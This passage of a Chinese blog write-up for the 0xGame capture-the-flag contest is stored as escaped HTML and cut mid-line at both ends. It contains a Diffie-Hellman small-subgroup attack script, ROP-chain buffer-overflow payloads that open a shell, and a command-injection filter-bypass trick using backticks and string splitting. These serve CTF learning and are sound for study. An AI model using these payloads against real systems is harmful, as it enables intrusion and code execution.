class=\"line\">        flag = unpad(cipher.decrypt(enc), <span class=\"number\">16</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        flag_str = flag.decode()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 成功获取 Flag: <span class=\"subst\">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> flag_str</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] 错误: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">import</span> traceback</span><br><span class=\"line\">        traceback.print_exc()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        sock.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit_with_pwntools</span>():</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    pwntools 版本 - 需要安装 pwntools</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> PWNTOOLS_AVAILABLE:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    host = <span class=\"string\">&quot;nc1.ctfplus.cn&quot;</span></span><br><span class=\"line\">    port = <span class=\"number\">34869</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 连接到服务器: &#123;&#125;:&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(host, port))</span><br><span class=\"line\">    conn = remote(host, port)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Prime</span></span><br><span class=\"line\">        conn.recvuntil(<span class=\"string\">b&quot;The Prime is &quot;</span>)</span><br><span class=\"line\">        p = <span class=\"built_in\">int</span>(conn.recvline().strip())</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Prime (p): <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Generator</span></span><br><span class=\"line\">        conn.recvuntil(<span class=\"string\">b&quot;The Generator is &quot;</span>)</span><br><span class=\"line\">        g = <span class=\"built_in\">int</span>(conn.recvline().strip())</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Generator (g): <span class=\"subst\">&#123;g&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Alice&#x27;s Public Key</span></span><br><span class=\"line\">        conn.recvuntil(<span class=\"string\">b&quot;Alice&#x27;s Public Key is &quot;</span>)</span><br><span class=\"line\">        A = <span class=\"built_in\">int</span>(conn.recvline().strip())</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Alice&#x27;s Public Key (A): <span class=\"subst\">&#123;A&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 发送恶意的 Bob&#x27;s Public Key = 1</span></span><br><span class=\"line\">        conn.recvuntil(<span class=\"string\">b&quot;Bob&#x27;s Public Key: &quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 发送恶意 Bob&#x27;s Public Key: 1&quot;</span>)</span><br><span class=\"line\">        conn.sendline(<span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收加密的 Flag</span></span><br><span class=\"line\">        conn.recvuntil(<span class=\"string\">b&quot;Encrypted Flag: &quot;</span>)</span><br><span class=\"line\">        enc_hex = conn.recvline().strip().decode()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 加密的 Flag: <span class=\"subst\">&#123;enc_hex&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 使用已知的共享密钥 s = 1 解密</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 正在解密...&quot;</span>)</span><br><span class=\"line\">        s = <span class=\"number\">1</span></span><br><span class=\"line\">        key = sha256(long_to_bytes(s)).digest()</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">        enc = <span class=\"built_in\">bytes</span>.fromhex(enc_hex)</span><br><span class=\"line\">        flag = unpad(cipher.decrypt(enc), <span class=\"number\">16</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        flag_str = flag.decode()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 成功获取 Flag: <span class=\"subst\">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> flag_str</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] 错误: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">import</span> traceback</span><br><span class=\"line\">        traceback.print_exc()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        conn.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Diffie-Hellman 小子群攻击&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Target: nc1.ctfplus.cn:34869&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 先尝试 pwntools 版本，如果失败则用手动版本</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> PWNTOOLS_AVAILABLE:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 尝试使用 pwntools...&quot;</span>)</span><br><span class=\"line\">        flag = exploit_with_pwntools()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] pwntools 未安装，使用手动版本...&quot;</span>)</span><br><span class=\"line\">        flag = <span class=\"literal\">None</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] 使用手动版本（只需要 socket + pycryptodome）...&quot;</span>)</span><br><span class=\"line\">        flag = exploit_manual()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] 攻击原理:&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;    1. 服务器计算共享密钥: s = B^a mod p&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;    2. 我们发送 B = 1&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;    3. 则 s = 1^a mod p = 1 (已知值)&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;    4. 使用 s = 1 作为密钥解密 flag&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] 攻击失败，请检查网络连接或服务器状态&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>flag :<code>0xgame&#123;ECC_1s_4w3s0m3_but_n0t_perf3ct&#125;</code></p>\n","excerpt":"","more":"<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><h2 id=\"数学题😭\"><a href=\"#数学题😭\" class=\"headerlink\" title=\"数学题😭\"></a>数学题😭</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">io=remote(<span class=\"string\">&quot;nc1.ctfplus.cn&quot;</span>,<span class=\"number\">23143</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Kore wa shiren da!(n&quot;</span>)</span><br><span class=\"line\"> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1000</span>):</span><br><span class=\"line\">\t t=io.recvuntil(<span class=\"string\">b&quot;?&quot;</span>)[:-<span class=\"number\">3</span>]</span><br><span class=\"line\">\t <span class=\"keyword\">if</span> <span class=\"string\">b&quot;x&quot;</span> <span class=\"keyword\">in</span> t:</span><br><span class=\"line\">\t\tt=t.decode()</span><br><span class=\"line\">\t\tt =t.replace(<span class=\"string\">&quot;x&quot;</span>,<span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">\t\tt=t.encode()</span><br><span class=\"line\">\t num=<span class=\"built_in\">eval</span>(t)</span><br><span class=\"line\">\t io.sendline(<span class=\"built_in\">str</span>(num).encode())</span><br><span class=\"line\">\t io.recvline()</span><br><span class=\"line\">\t io.recvline()</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"nc\"><a href=\"#nc\" class=\"headerlink\" title=\"nc\"></a>nc</h2><p><code>nc 域名/IP 端口号</code></p>\n<h2 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h2><p><code>ca\\t flag </code>这样就可以啦。</p>\n<h2 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h2><p><code>buf</code>到<code>rbp</code>的偏移+8就是填充的垃圾数据的长度，后面再加上目标函数的返回地址就行了。</p>\n<h2 id=\"ROP1\"><a href=\"#ROP1\" class=\"headerlink\" title=\"ROP1\"></a>ROP1</h2><p>找到<code>rdi</code>，一参寄存器的地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary pwn --only <span class=\"string\">&quot;pop|ret&quot;</span> | grep <span class=\"string\">&quot;rdi&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>找到想要rdi存放的参数<code>sh</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary pwn --string <span class=\"string\">&quot;sh&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后就同上一题栈溢出，构造ROP链。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload=<span class=\"number\">0x28</span>*<span class=\"string\">b&#x27;a&#x27;</span>+p64(<span class=\"number\">0x000000000040117e</span>)+p64(<span class=\"number\">0x000000000040201e</span>)+p64(<span class=\"number\">0x401195</span>)</span><br></pre></td></tr></table></figure>\n\n<p>就能得到flag了。</p>\n<p>完整代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">io=process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">gdb.attach(io)      // gdb调试</span><br><span class=\"line\">payload=<span class=\"number\">0x28</span>*<span class=\"string\">b&#x27;a&#x27;</span>+p64(<span class=\"number\">0x000000000040117e</span>)+p64(<span class=\"number\">0x000000000040201e</span>)+p64(<span class=\"number\">0x401195</span>)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ROP2\"><a href=\"#ROP2\" class=\"headerlink\" title=\"ROP2\"></a>ROP2</h2><p>除了<code>sh</code>,<code>cat</code>,还有<code>$0</code>也可以获得shell，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb ./pwn</span><br></pre></td></tr></table></figure>\n\n<p>可以在gdb中找到<code>$0</code>字符串</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search <span class=\"string\">&quot;$0&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>找到<code>$0</code>的地址后就对应替换<code>rdi</code>参数的地址。ROP链同上题。</p>\n<h1 id=\"Osint\"><a href=\"#Osint\" class=\"headerlink\" title=\"Osint\"></a>Osint</h1><p>图一谷歌识图，注意山名是中文，大室山</p>\n<p>图二拍摄时的经纬度其实在照片的详细信息里已经记录了，右键属性详细信息，往下滑就能找到GPS，里面就记录了经纬度，然后进行换算，不进位，就得到了<code>32.1191</code>经度和<code>118.9265</code> 纬度。</p>\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"Lemon\"><a href=\"#Lemon\" class=\"headerlink\" title=\"Lemon\"></a>Lemon</h2><p><code>web</code>是真不会，我只会开发者工具查看源码,然后就只会解签到。真的看不懂<code>php</code>😭。（骗你的，就算懂了也不会改写<code>http</code>请求。）</p>\n<h2 id=\"Http请求\"><a href=\"#Http请求\" class=\"headerlink\" title=\"Http请求\"></a>Http请求</h2><p>url后面加<code>/?hello=web</code>这就是get传递。</p>\n<p>然后用burp抓包，对应修改请求参数，就能得到flag了。</p>\n<p><code>0XGame&#123;Congratuation_You_Are_Http_God!!!&#125;</code></p>\n<h2 id=\"rce1\"><a href=\"#rce1\" class=\"headerlink\" title=\"rce1\"></a>rce1</h2><p><img src=\"/images/wp/hackbar.png\" alt=\"hackbar\"></p>\n<p>右键检查&gt;&gt;找到hackbar，按上面的设置参数，注意<code>rce1[]=1</code>这样才表示rce1是数组.数组的md5相等。一些指令参数被过滤的话可以试试其他的，如<code>readfile</code>,<code>print</code>等，然后可以用引号把一些指令隔开，分开来写就不会被过滤了。如<code>&#39;fl&#39;.&#39;a&#39;&#39;g&#39;</code>,引号之间用.拼接。对于要执行的命令需要用反引号，如<code>print(`tac f???`)</code>,反引号表示运行里面的命令。</p>\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>扫码关注喵~</p>\n<h2 id=\"Sign-In\"><a href=\"#Sign-In\" class=\"headerlink\" title=\"Sign-In\"></a>Sign-In</h2><p><code>==</code>结尾判断是base64加密，通过在线工具解密之后发现并不是<code>0xGame&#123;&#125;</code>,原来是还经过了字符移位，通过已知flag格式计算出偏移量，得到flag。</p>\n<h2 id=\"公众号\"><a href=\"#公众号\" class=\"headerlink\" title=\"公众号\"></a>公众号</h2><p><code>.docx</code>文件其实就是一个<code>.zip</code>压缩包，所以更改一下后缀名，然后将<code>.zip</code>文件解压，接下来就可以去一个个文件(如<code>.xml</code>文件)里找<code>flag</code>了。</p>\n<h2 id=\"shell\"><a href=\"#shell\" class=\"headerlink\" title=\"shell\"></a>shell</h2><p>按照yolo师傅给的提示操作就行</p>\n<h2 id=\"shell-plus\"><a href=\"#shell-plus\" class=\"headerlink\" title=\"shell_plus\"></a>shell_plus</h2><p>进入<code>welcome</code>用户后先<code>cat hash_value</code>找到哈希值，然后在<code>fikes</code>文件夹里用<code>find . -maxdepth 1 -type f -exec sha256sum &#123;&#125; \\; | grep &quot;c59aec252d136cd2da2c5af7b17aed68f661a0114e8fc38b6e2a3d4e993e38fa&quot;</code>这一行命令就可以找到那个加密的flag文件，最后用揭秘脚本解密。</p>\n<h2 id=\"LSB隐写\"><a href=\"#LSB隐写\" class=\"headerlink\" title=\"LSB隐写\"></a>LSB隐写</h2><p>StegSolve工具打开图片，R,G,B通道设为最低位0，就能看到flag了<code>0xGame&#123;W1_Need_t0_t@k3_a_break&#125;</code>。</p>\n<h2 id=\"磁盘镜像\"><a href=\"#磁盘镜像\" class=\"headerlink\" title=\"磁盘镜像\"></a>磁盘镜像</h2><p>在<code>bash</code>里用<code>TestDisk</code>分析磁盘</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">testdisk do_not_enter.dd</span><br></pre></td></tr></table></figure>\n\n<p>在分区表中发现了一个名为 <strong><code>[Do_not_enter]</code></strong> 的分区.</p>\n<p>挂载分区,</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> mount -o loop,offset=44040192 do_not_enter.dd /mnt/secret</span><br></pre></td></tr></table></figure>\n\n<p>查看分区内容,</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> -la /mnt/secret</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果有文件夹，深入查看</span></span><br><span class=\"line\">find /mnt/secret -<span class=\"built_in\">type</span> f -name <span class=\"string\">&quot;*flag*&quot;</span> 2&gt;/dev/null</span><br><span class=\"line\">find /mnt/secret -<span class=\"built_in\">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>\n\n<p>但不幸的是分区之中没有,不如直接用<code>strings</code>把全部字符串找出来吧，<code>strings</code>命令好用！</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> strings /mnt/secret/syslog</span><br><span class=\"line\"><span class=\"built_in\">sudo</span> strings /mnt/secret/auth.log</span><br></pre></td></tr></table></figure>\n\n<p>然后就找到了flag:<code>0xGame&#123;WoW_y0u_fouNd_1t?_114514&#125;</code></p>\n<h1 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h1><h2 id=\"SignIn\"><a href=\"#SignIn\" class=\"headerlink\" title=\"SignIn\"></a>SignIn</h2><p><code>shift</code>+F12  就可以看到所有字符串啦，包括flag🥰。</p>\n<h2 id=\"SignIn2\"><a href=\"#SignIn2\" class=\"headerlink\" title=\"SignIn2\"></a>SignIn2</h2><p>ROT加密：凯撒密码，移位操作进行字符加密。  0移位16得到@。从而得到<code>0xGame&#123;&#125;</code>形式的flag。</p>\n<h2 id=\"ZZZ\"><a href=\"#ZZZ\" class=\"headerlink\" title=\"ZZZ\"></a>ZZZ</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 导入z3库</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">x1 = BitVec(<span class=\"string\">&#x27;x1&#x27;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">x2 = BitVec(<span class=\"string\">&#x27;x2&#x27;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">x3 = BitVec(<span class=\"string\">&#x27;x3&#x27;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">x4 = BitVec(<span class=\"string\">&#x27;x4&#x27;</span>, <span class=\"number\">32</span>)</span><br><span class=\"line\">solver = Solver()</span><br><span class=\"line\">solver.add(<span class=\"number\">3</span> * x2 + <span class=\"number\">5</span> * x1 + <span class=\"number\">7</span> * x4 + <span class=\"number\">2</span> * x3 == -<span class=\"number\">1445932505</span>)</span><br><span class=\"line\">solver.add(<span class=\"number\">8</span> * x2 + <span class=\"number\">4</span> * x3 + <span class=\"number\">2</span> * x1 + x4 == -<span class=\"number\">672666814</span>)</span><br><span class=\"line\">solver.add(<span class=\"number\">7</span> * x2 + <span class=\"number\">3</span> * x1 + <span class=\"number\">5</span> * x4 + <span class=\"number\">4</span> * x3 == <span class=\"number\">958464147</span>)</span><br><span class=\"line\">solver.add(((x1 ^ x2) &lt;&lt; <span class=\"number\">6</span>) + (LShR(x3, <span class=\"number\">6</span>) ^ <span class=\"number\">0x4514</span>) == <span class=\"number\">123074281</span>)</span><br><span class=\"line\"><span class=\"comment\"># 循环寻找所有可能的</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> solver.check() == sat:</span><br><span class=\"line\">    model = solver.model()</span><br><span class=\"line\">    v1 = model[x1].as_long()</span><br><span class=\"line\">    v2 = model[x2].as_long()</span><br><span class=\"line\">    v3 = model[x3].as_long()</span><br><span class=\"line\">    v4 = model[x4].as_long()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x1 = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(v1)&#125;</span> (<span class=\"subst\">&#123;v1&#125;</span>)&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x2 = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(v2)&#125;</span> (<span class=\"subst\">&#123;v2&#125;</span>)&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x3 = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(v3)&#125;</span> (<span class=\"subst\">&#123;v3&#125;</span>)&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x4 = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(v4)&#125;</span> (<span class=\"subst\">&#123;v4&#125;</span>)&quot;</span>)</span><br><span class=\"line\">    final_flag = <span class=\"string\">f&quot;0xGame&#123;&#123;<span class=\"subst\">&#123;v1:08x&#125;</span><span class=\"subst\">&#123;v2:08x&#125;</span><span class=\"subst\">&#123;v3:08x&#125;</span><span class=\"subst\">&#123;v4:08x&#125;</span>&#125;&#125;&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Flag: <span class=\"subst\">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">    solver.add(Or(x1 != v1, x2 != v2, x3 != v3, x4 != v4))</span><br></pre></td></tr></table></figure>\n\n<p>此题有多解，注意正确flag的哈希值。</p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"维吉尼亚加密\"><a href=\"#维吉尼亚加密\" class=\"headerlink\" title=\"维吉尼亚加密\"></a>维吉尼亚加密</h2><p>全AI,维吉尼亚加密advanced我解出了多种可能，试了一下<code>0xGame&#123;excellent&#125;</code>这个是对的，就解出来了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span 